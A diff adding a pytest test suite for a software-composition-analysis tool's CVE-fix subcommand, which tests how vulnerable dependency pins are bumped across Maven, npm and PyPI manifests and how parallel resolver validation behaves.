@@ -1,0 +1,1551 @@
+"""Tests for ``packages.sca.update`` (the ``raptor-sca fix --cve-only`` subcommand)."""
+
+from __future__ import annotations
+
+import json
+from pathlib import Path
+
+import pytest
+
+from packages.sca import update
+
+# ---------------------------------------------------------------------------
+# Fixture helpers
+# ---------------------------------------------------------------------------
+
+def _vuln_row(
+    *,
+    ecosystem: str,
+    name: str,
+    version: str,
+    fixed_version: str | None,
+    manifest: Path,
+    advisory_id: str = "GHSA-x",
+    pin_style: str = "exact",
+    aliases: list[str] | None = None,
+    alias_name: str | None = None,
+) -> dict:
+    return {
+        "id": f"sca:vuln:{ecosystem}:{name}:{version}:{advisory_id}",
+        "vuln_type": "sca:vulnerable_dependency",
+        "tool": "sca",
+        "file": str(manifest),
+        "function": name,
+        "line": 0,
+        "severity": "high",
+        "description": f"{name}@{version} test",
+        "sca": {
+            "ecosystem": ecosystem,
+            "name": name,
+            "alias_name": alias_name,
+            "version": version,
+            "purl": f"pkg:{ecosystem.lower()}/{name}@{version}",
+            "pin_style": pin_style,
+            "fixed_version": fixed_version,
+            "advisory": {
+                "id": advisory_id,
+                "aliases": aliases or [],
+                "summary": "test",
+                "fixed_versions": [fixed_version] if fixed_version else [],
+                "references": [],
+                "severity": None,
+            },
+            "all_advisories": [],
+            "in_kev": False,
+            "epss": None,
+            "reachability": {"verdict": "imported",
+                             "confidence": {"level": "high",
+                                            "numeric": 0.95, "reason": "t"},
+                             "evidence": []},
+            "cvss_score": 7.5,
+            "cvss_vector": None,
+            "version_match_confidence": {"level": "high", "numeric": 0.95,
+                                         "reason": "t"},
+            "parser_confidence": {"level": "high", "numeric": 0.95,
+                                  "reason": "t"},
+            "exposure_factor": 0.0,
+            "transitive_depth": 0,
+            "related_findings": [],
+        },
+    }
+
+
+def _findings_file(tmp_path: Path, rows: list) -> Path:
+    p = tmp_path / "findings.json"
+    p.write_text(json.dumps(rows), encoding="utf-8")
+    return p
+
+
+# ---------------------------------------------------------------------------
+# pom.xml rewriter
+# ---------------------------------------------------------------------------
+
+def test_pom_xml_rewrite_bumps_version(tmp_path: Path) -> None:
+    pom = tmp_path / "pom.xml"
+    pom.write_text("""\
+<project xmlns="http://maven.apache.org/POM/4.0.0">
+  <dependencies>
+    <dependency>
+      <groupId>org.apache.logging.log4j</groupId>
+      <artifactId>log4j-core</artifactId>
+      <version>2.14.1</version>
+    </dependency>
+  </dependencies>
+</project>
+""", encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="Maven",
+        name="org.apache.logging.log4j:log4j-core",
+        version="2.14.1", fixed_version="2.17.1",
+        manifest=pom,
+    )])
+    out = tmp_path / "out"
+    rc = update.main([
+        "--findings", str(findings), "--out", str(out), "--allow-major",
+        "--offline",
+    ])
+    assert rc == 0
+    # Find the proposed file by walking the tree (path layout depends on cwd).
+    found = list((out / "proposed").rglob("pom.xml"))
+    assert len(found) == 1
+    body = found[0].read_text()
+    assert "<version>2.17.1</version>" in body
+    assert "<version>2.14.1</version>" not in body
+    changes = json.loads((out / "changes.json").read_text())
+    assert changes[0]["new_version"] == "2.17.1"
+
+
+def test_pom_xml_with_property_reference_skipped(tmp_path: Path) -> None:
+    pom = tmp_path / "pom.xml"
+    pom.write_text("""\
+<project xmlns="http://maven.apache.org/POM/4.0.0">
+  <properties><log4j.version>2.14.1</log4j.version></properties>
+  <dependencies><dependency>
+    <groupId>org.apache.logging.log4j</groupId>
+    <artifactId>log4j-core</artifactId>
+    <version>${log4j.version}</version>
+  </dependency></dependencies>
+</project>
+""", encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="Maven",
+        name="org.apache.logging.log4j:log4j-core",
+        version="2.14.1", fixed_version="2.17.1",
+        manifest=pom,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--allow-major",
+                  "--offline"])
+    changes = json.loads((out / "changes.json").read_text())
+    assert changes[0]["skipped_reason"] is not None
+    assert "property reference" in changes[0]["skipped_reason"]
+
+
+# ---------------------------------------------------------------------------
+# package.json rewriter
+# ---------------------------------------------------------------------------
+
+def test_package_json_caret_preserved(tmp_path: Path) -> None:
+    pkg = tmp_path / "package.json"
+    pkg.write_text(json.dumps({
+        "name": "demo",
+        "dependencies": {"lodash": "^4.17.4"},
+    }, indent=2), encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="npm", name="lodash",
+        version="4.17.4", fixed_version="4.17.21",
+        manifest=pkg, pin_style="caret",
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    proposed = next(iter((out / "proposed").rglob("package.json")))
+    obj = json.loads(proposed.read_text())
+    assert obj["dependencies"]["lodash"] == "^4.17.21"
+
+
+def test_package_json_exact_pin_replaced(tmp_path: Path) -> None:
+    pkg = tmp_path / "package.json"
+    pkg.write_text(json.dumps({
+        "name": "demo",
+        "dependencies": {"lodash": "4.17.4"},
+    }, indent=2), encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="npm", name="lodash",
+        version="4.17.4", fixed_version="4.17.21",
+        manifest=pkg,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    proposed = next(iter((out / "proposed").rglob("package.json")))
+    assert json.loads(proposed.read_text())["dependencies"]["lodash"] == "4.17.21"
+
+
+def test_package_json_git_url_skipped(tmp_path: Path) -> None:
+    pkg = tmp_path / "package.json"
+    pkg.write_text(json.dumps({
+        "dependencies": {"lodash": "git+https://github.com/lodash/lodash.git#v4.17.4"},
+    }), encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="npm", name="lodash",
+        version="4.17.4", fixed_version="4.17.21",
+        manifest=pkg,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    changes = json.loads((out / "changes.json").read_text())
+    assert changes[0]["skipped_reason"] is not None
+
+
+# ---------------------------------------------------------------------------
+# requirements.txt rewriter
+# ---------------------------------------------------------------------------
+
+def test_requirements_txt_rewrite(tmp_path: Path) -> None:
+    req = tmp_path / "requirements.txt"
+    req.write_text("# pinned\ndjango==4.2.7\nrequests>=2.31.0\n", encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="django",
+        version="4.2.7", fixed_version="4.2.10",
+        manifest=req,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    proposed = next(iter((out / "proposed").rglob("requirements.txt")))
+    body = proposed.read_text()
+    assert "django==4.2.10" in body
+    # Untouched line preserved.
+    assert "requests>=2.31.0" in body
+    assert "# pinned" in body
+
+
+def test_requirements_txt_pep503_normalisation(tmp_path: Path) -> None:
+    """``Foo_Bar.Baz`` in the manifest should match the PEP 503 form
+    ``foo-bar-baz`` carried in findings."""
+    req = tmp_path / "requirements.txt"
+    req.write_text("Foo_Bar.Baz==1.0.0\n", encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="foo-bar-baz",
+        version="1.0.0", fixed_version="1.0.1",
+        manifest=req,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    proposed = next(iter((out / "proposed").rglob("requirements.txt")))
+    assert "==1.0.1" in proposed.read_text()
+
+
+def test_requirements_txt_prose_comment_not_mangled(tmp_path: Path) -> None:
+    """A comment that mentions a package name as prose (not a pin)
+    must not be rewritten — regression for the '# pytest pinned
+    exactly: ...' mangling bug."""
+    req = tmp_path / "requirements-dev.txt"
+    req.write_text(
+        "# pytest pinned exactly: the root pytest.ini uses importlib\n"
+        "pytest==9.0.3\n",
+        encoding="utf-8",
+    )
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="pytest",
+        version="9.0.3", fixed_version="9.1.1",
+        manifest=req,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    proposed = next(iter((out / "proposed").rglob("requirements-dev.txt")))
+    body = proposed.read_text()
+    assert "pytest==9.1.1" in body
+    assert "# pytest pinned exactly:" in body
+
+
+def test_requirements_txt_bare_commented_dep_gets_pinned(tmp_path: Path) -> None:
+    """A bare ``# pytest`` (no version, no trailing prose) is a
+    commented-out dep — the rewriter should pin it so uncommenting
+    yields the safe version."""
+    req = tmp_path / "requirements.txt"
+    req.write_text(
+        "# pytest is an optional dep\n"
+        "# pytest\n"
+        "pytest==9.0.3\n",
+        encoding="utf-8",
+    )
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="pytest",
+        version="9.0.3", fixed_version="9.1.1",
+        manifest=req,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    proposed = next(iter((out / "proposed").rglob("requirements.txt")))
+    body = proposed.read_text()
+    assert "pytest==9.1.1" in body
+    assert "# pytest is an optional dep" in body
+    assert "# pytest==9.1.1" in body
+
+
+# ---------------------------------------------------------------------------
+# pyproject.toml rewriter
+# ---------------------------------------------------------------------------
+
+def test_pyproject_toml_pep621_rewrite(tmp_path: Path) -> None:
+    py = tmp_path / "pyproject.toml"
+    py.write_text("""\
+[project]
+dependencies = [
+  "django==4.2.7",
+  "requests~=2.31.0",
+]
+""", encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="django",
+        version="4.2.7", fixed_version="4.2.10",
+        manifest=py,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    proposed = next(iter((out / "proposed").rglob("pyproject.toml")))
+    body = proposed.read_text()
+    assert '"django==4.2.10"' in body
+    assert '"requests~=2.31.0"' in body
+
+
+def test_pyproject_toml_poetry_caret_preserved(tmp_path: Path) -> None:
+    py = tmp_path / "pyproject.toml"
+    py.write_text("""\
+[tool.poetry.dependencies]
+python = "^3.10"
+django = "^4.2.7"
+""", encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="django",
+        version="4.2.7", fixed_version="4.2.10",
+        manifest=py,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    proposed = next(iter((out / "proposed").rglob("pyproject.toml")))
+    body = proposed.read_text()
+    assert 'django = "^4.2.10"' in body
+    assert 'python = "^3.10"' in body
+
+
+def test_pyproject_toml_pep621_preserves_range_bounds(tmp_path: Path) -> None:
+    """PEP 621 entries keep the declared corridor around the new pin —
+    same behaviour as the requirements.txt rewriter."""
+    py = tmp_path / "pyproject.toml"
+    py.write_text("""\
+[project]
+dependencies = [
+  "requests>=2.0,<3.0",
+]
+""", encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="requests",
+        version="2.20.0", fixed_version="2.31.0",
+        manifest=py,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    proposed = next(iter((out / "proposed").rglob("pyproject.toml")))
+    assert '"requests>=2.0,==2.31.0,<3.0"' in proposed.read_text()
+
+
+def test_pyproject_toml_pep621_declines_out_of_corridor_target(
+    tmp_path: Path,
+) -> None:
+    """A fix target above the operator's declared ceiling is declined
+    (never emit an unsatisfiable spec)."""
+    py = tmp_path / "pyproject.toml"
+    py.write_text("""\
+[project]
+dependencies = [
+  "requests>=2.0,<2.25",
+]
+""", encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="requests",
+        version="2.20.0", fixed_version="2.31.0",
+        manifest=py,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    assert not list((out / "proposed").rglob("pyproject.toml"))
+    changes = json.loads((out / "changes.json").read_text())
+    assert "not safely bumpable" in changes[0]["skipped_reason"]
+
+
+def test_requirements_txt_declines_out_of_corridor_target(
+    tmp_path: Path,
+) -> None:
+    """``requests>=2.0,<2.25`` must not become
+    ``requests>=2.0,==2.31.0,<2.25`` — decline with a reason instead."""
+    req = tmp_path / "requirements.txt"
+    req.write_text("requests>=2.0,<2.25\n", encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="requests",
+        version="2.20.0", fixed_version="2.31.0",
+        manifest=req, pin_style="range",
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    assert not list((out / "proposed").rglob("requirements.txt"))
+    changes = json.loads((out / "changes.json").read_text())
+    assert "not safely bumpable" in changes[0]["skipped_reason"]
+
+
+def test_pypi_pin_preserving_bounds_corridor_conflicts() -> None:
+    from packages.sca.update import _pypi_pin_preserving_bounds
+
+    # Target above the ceiling → decline.
+    assert _pypi_pin_preserving_bounds(">=2.0,<2.25", "2.31.0") is None
+    assert _pypi_pin_preserving_bounds("<=2.25", "2.31.0") is None
+    # Target below the floor → decline.
+    assert _pypi_pin_preserving_bounds(">=2.0", "1.9") is None
+    assert _pypi_pin_preserving_bounds(">2.0", "2.0") is None
+    # In-corridor target keeps both bounds.
+    assert (_pypi_pin_preserving_bounds(">=2.0,<3.0", "2.31.0")
+            == ">=2.0,==2.31.0,<3.0")
+    # floor_raise: ceiling still guards; old floor is replaced.
+    assert _pypi_pin_preserving_bounds(
+        ">=2.0,<2.25", "2.31.0", floor_raise=True) is None
+    assert (_pypi_pin_preserving_bounds(
+        ">=2.0,<3.0", "2.31.0", floor_raise=True) == ">=2.31.0,<3.0")
+    # Uncomparable bound → decline rather than guess.
+    assert _pypi_pin_preserving_bounds("<not-a-version", "2.31.0") is None
+
+
+# ---------------------------------------------------------------------------
+# Mode flags
+# ---------------------------------------------------------------------------
+
+def test_fix_filter_restricts_to_listed_advisories(tmp_path: Path) -> None:
+    pkg = tmp_path / "package.json"
+    pkg.write_text(json.dumps({
+        "dependencies": {"a": "1.0.0", "b": "2.0.0"},
+    }), encoding="utf-8")
+    findings = _findings_file(tmp_path, [
+        _vuln_row(ecosystem="npm", name="a", version="1.0.0",
+                  fixed_version="1.5.0", manifest=pkg,
+                  advisory_id="GHSA-keep"),
+        _vuln_row(ecosystem="npm", name="b", version="2.0.0",
+                  fixed_version="2.5.0", manifest=pkg,
+                  advisory_id="GHSA-skip"),
+    ])
+    out = tmp_path / "out"
+    update.main([
+        "--findings", str(findings),
+        "--out", str(out),
+        "--fix", "GHSA-keep",
+        "--offline",
+    ])
+    changes = json.loads((out / "changes.json").read_text())
+    names = {c["name"] for c in changes}
+    assert names == {"a"}
+
+
+def test_minimal_picks_max_fix_across_findings(tmp_path: Path) -> None:
+    """Two CVEs against the same dep with fixes 1.5 and 1.10 — the
+    proposed bump must be 1.10."""
+    pkg = tmp_path / "package.json"
+    pkg.write_text(json.dumps({"dependencies": {"x": "1.0.0"}}),
+                   encoding="utf-8")
+    findings = _findings_file(tmp_path, [
+        _vuln_row(ecosystem="npm", name="x", version="1.0.0",
+                  fixed_version="1.5.0", manifest=pkg,
+                  advisory_id="GHSA-1"),
+        _vuln_row(ecosystem="npm", name="x", version="1.0.0",
+                  fixed_version="1.10.0", manifest=pkg,
+                  advisory_id="GHSA-2"),
+    ])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    proposed = next(iter((out / "proposed").rglob("package.json")))
+    assert json.loads(proposed.read_text())["dependencies"]["x"] == "1.10.0"
+
+
+def test_allow_major_gates_cross_major_upgrade(tmp_path: Path) -> None:
+    pkg = tmp_path / "package.json"
+    pkg.write_text(json.dumps({"dependencies": {"x": "1.0.0"}}),
+                   encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="npm", name="x", version="1.0.0",
+        fixed_version="2.0.0", manifest=pkg,
+    )])
+    out_no_major = tmp_path / "out_no_major"
+    rc = update.main([
+        "--findings", str(findings), "--out", str(out_no_major),
+        "--offline",
+    ])
+    # No proposed file because the only fix crosses a major boundary
+    # and --allow-major wasn't supplied.
+    assert rc == 0
+    assert not (out_no_major / "proposed").exists()
+
+    out_allow = tmp_path / "out_allow"
+    update.main([
+        "--findings", str(findings), "--out", str(out_allow),
+        "--allow-major", "--offline",
+    ])
+    proposed = next(iter((out_allow / "proposed").rglob("package.json")))
+    assert json.loads(proposed.read_text())["dependencies"]["x"] == "2.0.0"
+
+
+def test_pin_only_skips_loose_pins(tmp_path: Path) -> None:
+    pkg = tmp_path / "package.json"
+    pkg.write_text(json.dumps({
+        "dependencies": {"x": "^1.0.0", "y": "1.0.0"},
+    }), encoding="utf-8")
+    findings = _findings_file(tmp_path, [
+        _vuln_row(ecosystem="npm", name="x", version="1.0.0",
+                  fixed_version="1.5.0", manifest=pkg, pin_style="caret"),
+        _vuln_row(ecosystem="npm", name="y", version="1.0.0",
+                  fixed_version="1.5.0", manifest=pkg, pin_style="exact"),
+    ])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out),
+                 "--pin-only", "--offline"])
+    changes = {c["name"]: c for c in json.loads(
+        (out / "changes.json").read_text(),
+    )}
+    assert changes["y"]["skipped_reason"] is None
+    assert changes["x"]["skipped_reason"] is not None
+    assert "pin-only" in changes["x"]["skipped_reason"]
+
+
+# ---------------------------------------------------------------------------
+# Argument validation
+# ---------------------------------------------------------------------------
+
+def test_neither_findings_nor_target_returns_2(tmp_path: Path) -> None:
+    with pytest.raises(SystemExit) as exc:
+        update.main(["--out", str(tmp_path / "out")])
+    assert exc.value.code == 2
+
+
+def test_findings_missing_returns_2(tmp_path: Path) -> None:
+    rc = update.main(["--findings", str(tmp_path / "nope.json"),
+                      "--out", str(tmp_path / "out")])
+    assert rc == 2
+
+
+# ---------------------------------------------------------------------------
+# api-compat risk surfacing
+# ---------------------------------------------------------------------------
+
+def test_changes_json_carries_compat_risks_for_major_bump(
+    tmp_path: Path,
+) -> None:
+    """A 3.x → 4.x bump is semver-major; the compat heuristic must fire
+    and the JSON output must carry the structured ``compat_risks``
+    entries so downstream consumers (LLM review, PR commenter, CI gate)
+    can read them."""
+    req = tmp_path / "requirements.txt"
+    req.write_text("django==3.2.0\n", encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="django",
+        version="3.2.0", fixed_version="4.0.0",
+        manifest=req,
+    )])
+    out = tmp_path / "out"
+    # ``--allow-major`` because the upgrade crosses 3 → 4; ``--offline``
+    # to keep the test hermetic — semver risk fires from version
+    # strings alone, no PyPI roundtrip needed.
+    update.main([
+        "--findings", str(findings), "--out", str(out),
+        "--allow-major", "--offline",
+    ])
+    changes = json.loads((out / "changes.json").read_text())
+    assert len(changes) == 1
+    assert "compat_risks" in changes[0]
+    risks = changes[0]["compat_risks"]
+    assert any(r["kind"] == "semver_major" and r["severity"] == "high"
+               for r in risks)
+    assert changes[0]["compat_overall_severity"] == "high"
+
+
+def test_changes_md_compat_column_and_detail_block(
+    tmp_path: Path,
+) -> None:
+    """The markdown rendering must surface a Compat column AND a detail
+    block when any change has non-empty risks."""
+    req = tmp_path / "requirements.txt"
+    req.write_text("django==3.2.0\n", encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="django",
+        version="3.2.0", fixed_version="4.0.0",
+        manifest=req,
+    )])
+    out = tmp_path / "out"
+    update.main([
+        "--findings", str(findings), "--out", str(out),
+        "--allow-major", "--offline",
+    ])
+    md = (out / "changes.md").read_text()
+    assert "| Compat |" in md
+    assert "**high**" in md
+    assert "Upgrade-compat risk detail" in md
+    assert "semver-major" in md
+
+
+def test_changes_no_compat_column_value_for_clean_minor_bump(
+    tmp_path: Path,
+) -> None:
+    """When a minor-bump upgrade has no risks, the Compat cell is "—"
+    and no detail block is emitted."""
+    req = tmp_path / "requirements.txt"
+    req.write_text("django==4.2.7\n", encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="django",
+        version="4.2.7", fixed_version="4.2.10",
+        manifest=req,
+    )])
+    out = tmp_path / "out"
+    update.main([
+        "--findings", str(findings), "--out", str(out), "--offline",
+    ])
+    changes = json.loads((out / "changes.json").read_text())
+    # No compat risks → compat_risks key absent.
+    assert "compat_risks" not in changes[0]
+    md = (out / "changes.md").read_text()
+    assert "| — |" in md
+    assert "Upgrade-compat risk detail" not in md
+
+
+def test_offline_and_allow_cascade_are_mutually_exclusive(
+    tmp_path: Path, capsys: pytest.CaptureFixture,
+) -> None:
+    """``--offline --allow-cascade`` is operator confusion: the cascade
+    resolver shells out to npm/pip/go which all need network. Reject
+    at argparse time so the operator sees a clear message instead of
+    a confusing resolver-can't-reach-registry failure deep in the run.
+    """
+    findings = tmp_path / "findings.json"
+    findings.write_text("[]", encoding="utf-8")
+    with pytest.raises(SystemExit) as exc:
+        update.main([
+            "--findings", str(findings),
+            "--out", str(tmp_path / "out"),
+            "--offline", "--allow-cascade",
+        ])
+    assert exc.value.code == 2     # argparse error exit
+    err = capsys.readouterr().err
+    assert "mutually exclusive" in err
+    assert "--offline" in err and "--allow-cascade" in err
+
+
+# ---------------------------------------------------------------------------
+# Cascade validation (parallel per-ecosystem dispatch)
+# ---------------------------------------------------------------------------
+
+
+class _StubResolver:
+    """Minimal Resolver stub for cascade tests.
+
+    ``available`` / ``success`` / ``error`` / ``proposed_lockfile``
+    drive the verdict. ``barrier`` (when supplied) lets multiple
+    threads synchronise so we can verify the resolvers actually run
+    concurrently.
+    """
+
+    def __init__(
+        self, *, available=True, success=True, error=None,
+        proposed_lockfile=None, barrier=None,
+    ):
+        self._available = available
+        self._success = success
+        self._error = error
+        self._lockfile = proposed_lockfile
+        self._barrier = barrier
+        self.dry_run_calls = []
+
+    def is_available(self):
+        return self._available
+
+    def dry_run(self, project_dir, *, timeout=120):
+        if self._barrier is not None:
+            # Block until all threads reach this point — proves
+            # concurrent execution.
+            self._barrier.wait(timeout=5)
+        self.dry_run_calls.append(project_dir)
+        # Build a fake ResolverResult — duck-typed to what
+        # _validate_one_ecosystem reads.
+        from packages.sca.resolvers import ResolverResult
+        return ResolverResult(
+            ecosystem="stub",
+            success=self._success,
+            available=self._available,
+            error=self._error,
+            proposed_lockfile=self._lockfile,
+        )
+
+
+def _make_proposed(tmp_path: Path, eco_to_files: dict) -> Path:
+    """Build a tmp_path/out/proposed/ tree mirroring the CWD-relative
+    layout the cascade expects."""
+    out = tmp_path / "out"
+    proposed = out / "proposed"
+    proposed.mkdir(parents=True, exist_ok=True)
+    for eco_path, content in eco_to_files.items():
+        target = proposed / eco_path
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text(content, encoding="utf-8")
+    return out
+
+
+def _make_change(
+    *, ecosystem: str, name: str = "pkg", manifest: Path,
+) -> update.UpgradeChange:
+    return update.UpgradeChange(
+        ecosystem=ecosystem, name=name,
+        old_version="1.0.0", new_version="1.0.1",
+        manifest=manifest,
+        advisory_ids=("GHSA-x",),
+    )
+
+
+def test_cascade_parallel_runs_resolver_per_ecosystem(
+    tmp_path: Path, monkeypatch,
+) -> None:
+    """All ecosystems get their resolver invoked. Result count
+    matches input ecosystem count."""
+    cwd = Path.cwd()
+    out = _make_proposed(tmp_path, {})
+
+    npm_resolver = _StubResolver()
+    pypi_resolver = _StubResolver()
+    go_resolver = _StubResolver()
+
+    def fake_get_resolver(eco, *, project_dir):
+        return {
+            "npm": npm_resolver,
+            "PyPI": pypi_resolver,
+            "Go": go_resolver,
+        }.get(eco)
+
+    monkeypatch.setattr(
+        "packages.sca.resolvers.get_resolver", fake_get_resolver,
+    )
+
+    applied = [
+        _make_change(ecosystem="npm", manifest=cwd / "package.json"),
+        _make_change(ecosystem="PyPI", manifest=cwd / "requirements.txt"),
+        _make_change(ecosystem="Go", manifest=cwd / "go.mod"),
+    ]
+    update._run_cascade_validation(applied, out)
+
+    cascade = json.loads((out / "cascade.json").read_text())
+    assert len(cascade) == 3
+    ecos = {row["ecosystem"] for row in cascade}
+    assert ecos == {"npm", "PyPI", "Go"}
+    # Each resolver got exactly one dry_run call.
+    assert len(npm_resolver.dry_run_calls) == 1
+    assert len(pypi_resolver.dry_run_calls) == 1
+    assert len(go_resolver.dry_run_calls) == 1
+
+
+def test_cascade_resolver_crash_isolates_to_one_ecosystem(
+    tmp_path: Path, monkeypatch,
+) -> None:
+    """A resolver subprocess that raises rather than returning a
+    result fails just THAT ecosystem with verdict='error'; other
+    ecosystems still report cleanly."""
+    cwd = Path.cwd()
+    out = _make_proposed(tmp_path, {})
+
+    class _CrashingResolver(_StubResolver):
+        def dry_run(self, project_dir, *, timeout=120):
+            raise RuntimeError("simulated crash")
+
+    crashing = _CrashingResolver()
+    healthy = _StubResolver()
+
+    def fake_get_resolver(eco, *, project_dir):
+        return {"npm": crashing, "PyPI": healthy}.get(eco)
+
+    monkeypatch.setattr(
+        "packages.sca.resolvers.get_resolver", fake_get_resolver,
+    )
+
+    applied = [
+        _make_change(ecosystem="npm", manifest=cwd / "package.json"),
+        _make_change(ecosystem="PyPI", manifest=cwd / "requirements.txt"),
+    ]
+    update._run_cascade_validation(applied, out)
+    cascade = json.loads((out / "cascade.json").read_text())
+    rows = {r["ecosystem"]: r for r in cascade}
+    assert rows["npm"]["verdict"] == "error"
+    assert "simulated crash" in rows["npm"]["reason"]
+    assert rows["PyPI"]["verdict"] == "ok"
+
+
+def test_cascade_unsupported_and_skipped_verdicts(
+    tmp_path: Path, monkeypatch,
+) -> None:
+    """No resolver registered → unsupported. Resolver present but
+    tool not in PATH → skipped."""
+    cwd = Path.cwd()
+    out = _make_proposed(tmp_path, {})
+
+    unavailable_resolver = _StubResolver(available=False)
+
+    def fake_get_resolver(eco, *, project_dir):
+        if eco == "Maven":
+            return None       # unsupported
+        if eco == "PyPI":
+            return unavailable_resolver
+        return None
+
+    monkeypatch.setattr(
+        "packages.sca.resolvers.get_resolver", fake_get_resolver,
+    )
+
+    applied = [
+        _make_change(ecosystem="Maven", manifest=cwd / "pom.xml"),
+        _make_change(ecosystem="PyPI", manifest=cwd / "requirements.txt"),
+    ]
+    update._run_cascade_validation(applied, out)
+    cascade = json.loads((out / "cascade.json").read_text())
+    rows = {r["ecosystem"]: r for r in cascade}
+    assert rows["Maven"]["verdict"] == "unsupported"
+    assert rows["PyPI"]["verdict"] == "skipped"
+    assert "PATH" in rows["PyPI"]["reason"]
+
+
+def test_cascade_lockfile_capture(
+    tmp_path: Path, monkeypatch,
+) -> None:
+    """When a resolver returns a proposed_lockfile, it gets written
+    under cascade-<eco>.lock with the right contents."""
+    cwd = Path.cwd()
+    out = _make_proposed(tmp_path, {})
+
+    resolver = _StubResolver(proposed_lockfile=b"lockfile-bytes")
+
+    monkeypatch.setattr(
+        "packages.sca.resolvers.get_resolver",
+        lambda eco, *, project_dir: resolver,
+    )
+
+    applied = [
+        _make_change(ecosystem="npm", manifest=cwd / "package.json"),
+    ]
+    update._run_cascade_validation(applied, out)
+    lockfile_path = out / "cascade-npm.lock"
+    assert lockfile_path.exists()
+    assert lockfile_path.read_bytes() == b"lockfile-bytes"
+
+
+def test_cascade_preserves_input_order_in_summary(
+    tmp_path: Path, monkeypatch,
+) -> None:
+    """cascade.json rows come back in the same ecosystem order as
+    by_eco's keys (which preserve insertion order from ``applied``).
+    Important so diffs against the previous sequential implementation
+    are deterministic."""
+    cwd = Path.cwd()
+    out = _make_proposed(tmp_path, {})
+
+    monkeypatch.setattr(
+        "packages.sca.resolvers.get_resolver",
+        lambda eco, *, project_dir: _StubResolver(),
+    )
+
+    applied = [
+        _make_change(ecosystem="Go", manifest=cwd / "go.mod"),
+        _make_change(ecosystem="npm", manifest=cwd / "package.json"),
+        _make_change(ecosystem="PyPI", manifest=cwd / "requirements.txt"),
+    ]
+    update._run_cascade_validation(applied, out)
+    cascade = json.loads((out / "cascade.json").read_text())
+    assert [row["ecosystem"] for row in cascade] == ["Go", "npm", "PyPI"]
+
+
+def test_cascade_threads_run_concurrently(
+    tmp_path: Path, monkeypatch,
+) -> None:
+    """Three resolvers all rendezvous at a barrier — proves the
+    thread pool genuinely runs them in parallel rather than
+    serialising."""
+    import threading
+    cwd = Path.cwd()
+    out = _make_proposed(tmp_path, {})
+
+    barrier = threading.Barrier(3, timeout=5)
+    resolvers = [_StubResolver(barrier=barrier) for _ in range(3)]
+
+    def fake_get_resolver(eco, *, project_dir):
+        return {
+            "npm": resolvers[0],
+            "PyPI": resolvers[1],
+            "Go": resolvers[2],
+        }.get(eco)
+
+    monkeypatch.setattr(
+        "packages.sca.resolvers.get_resolver", fake_get_resolver,
+    )
+
+    applied = [
+        _make_change(ecosystem="npm", manifest=cwd / "package.json"),
+        _make_change(ecosystem="PyPI", manifest=cwd / "requirements.txt"),
+        _make_change(ecosystem="Go", manifest=cwd / "go.mod"),
+    ]
+    # If the implementation were sequential, the barrier would never
+    # release (only one thread ever arrives at a time), and dry_run
+    # would raise BrokenBarrierError on timeout. Successful
+    # completion proves concurrent execution.
+    update._run_cascade_validation(applied, out)
+    cascade = json.loads((out / "cascade.json").read_text())
+    assert len(cascade) == 3
+    assert all(r["verdict"] == "ok" for r in cascade)
+
+
+def test_cascade_empty_applied_no_op(
+    tmp_path: Path, monkeypatch,
+) -> None:
+    """Defensive: empty input → empty cascade.json, no exceptions."""
+    out = _make_proposed(tmp_path, {})
+    monkeypatch.setattr(
+        "packages.sca.resolvers.get_resolver",
+        lambda eco, *, project_dir: _StubResolver(),
+    )
+    update._run_cascade_validation([], out)
+    cascade = json.loads((out / "cascade.json").read_text())
+    assert cascade == []
+
+
+# ---------------------------------------------------------------------------
